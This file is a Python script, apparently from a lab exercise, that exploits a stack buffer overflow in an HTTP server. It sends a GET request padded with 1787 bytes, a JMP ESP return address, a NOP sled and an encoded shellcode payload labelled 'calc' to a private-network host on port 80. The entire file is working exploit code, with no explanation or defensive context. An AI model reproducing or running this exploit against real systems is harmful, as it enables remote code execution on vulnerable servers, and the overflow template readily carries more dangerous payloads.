#!/usr/bin/python

import sys
import struct
import socket


#Log data, item 24
 #Address=77EF6E7E
 #Message=  0x77ef6e7e : "\xff\xe4" | ASLR: False, Rebase: False, SafeSEH: True, OS: True

#bad \x00\x0a\x0d

calc = ("\x89\xe1\xdb\xd4\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" +
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" +
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" +
"\x42\x75\x4a\x49\x39\x6c\x7a\x48\x4d\x59\x53\x30\x53\x30" +
"\x43\x30\x71\x70\x6b\x39\x6d\x35\x46\x51\x4e\x32\x50\x64" +
"\x6c\x4b\x63\x62\x76\x50\x6c\x4b\x50\x52\x76\x6c\x4c\x4b" +
"\x46\x32\x77\x64\x4c\x4b\x64\x32\x34\x68\x56\x6f\x4d\x67" +
"\x50\x4a\x74\x66\x56\x51\x49\x6f\x35\x61\x6f\x30\x4e\x4c" +
"\x67\x4c\x75\x31\x71\x6c\x63\x32\x54\x6c\x75\x70\x49\x51" +
"\x5a\x6f\x64\x4d\x47\x71\x4a\x67\x7a\x42\x78\x70\x51\x42" +
"\x53\x67\x4c\x4b\x51\x42\x54\x50\x6e\x6b\x53\x72\x67\x4c" +
"\x57\x71\x48\x50\x6e\x6b\x33\x70\x30\x78\x4c\x45\x39\x50" +
"\x53\x44\x70\x4a\x65\x51\x48\x50\x30\x50\x6e\x6b\x57\x38" +
"\x45\x48\x6c\x4b\x31\x48\x67\x50\x77\x71\x4b\x63\x38\x63" +
"\x75\x6c\x67\x39\x4e\x6b\x50\x34\x6e\x6b\x66\x61\x6a\x76" +
"\x50\x31\x59\x6f\x56\x51\x6f\x30\x6c\x6c\x4b\x71\x48\x4f" +
"\x34\x4d\x43\x31\x5a\x67\x44\x78\x59\x70\x44\x35\x78\x74" +
"\x54\x43\x53\x4d\x78\x78\x75\x6b\x43\x4d\x34\x64\x53\x45" +
"\x49\x72\x76\x38\x6e\x6b\x72\x78\x54\x64\x33\x31\x69\x43" +
"\x53\x56\x4c\x4b\x34\x4c\x50\x4b\x4e\x6b\x46\x38\x75\x4c" +
"\x73\x31\x69\x43\x4e\x6b\x34\x44\x4e\x6b\x47\x71\x4e\x30" +
"\x6f\x79\x50\x44\x64\x64\x47\x54\x71\x4b\x63\x6b\x51\x71" +
"\x61\x49\x73\x6a\x53\x61\x4b\x4f\x59\x70\x56\x38\x43\x6f" +
"\x62\x7a\x6c\x4b\x66\x72\x78\x6b\x4f\x76\x71\x4d\x71\x7a" +
"\x63\x31\x4c\x4d\x4c\x45\x58\x39\x67\x70\x73\x30\x77\x70" +
"\x66\x30\x32\x48\x70\x31\x6c\x4b\x42\x4f\x6b\x37\x59\x6f" +
"\x48\x55\x6f\x4b\x58\x70\x4c\x75\x39\x32\x62\x76\x50\x68" +
"\x69\x36\x6e\x75\x4f\x4d\x4d\x4d\x59\x6f\x38\x55\x37\x4c" +
"\x34\x46\x53\x4c\x76\x6a\x4f\x70\x59\x6b\x49\x70\x43\x45" +
"\x37\x75\x4f\x4b\x63\x77\x46\x73\x43\x42\x70\x6f\x71\x7a" +
"\x73\x30\x51\x43\x79\x6f\x59\x45\x33\x53\x61\x71\x52\x4c" +
"\x43\x53\x44\x6e\x55\x35\x74\x38\x70\x65\x47\x70\x41\x41")



get = "GET "
a = "A" * 1787
b = struct.pack("<I",0x77EF6E7E)
nops = "\x90" * 25
c = "C" * (600 - (len(calc) + len(nops)))


http = " HTTP/1.1 \r\n"

host = "Host: 172.31.1.205 \r\n"

user = "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 \r\n\r\n"



buff = get + a +b+ nops + calc + c + http + host + user


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "172.31.1.205"
port = 80

soc.connect((host, port))
soc.send(buff)
soc.close()

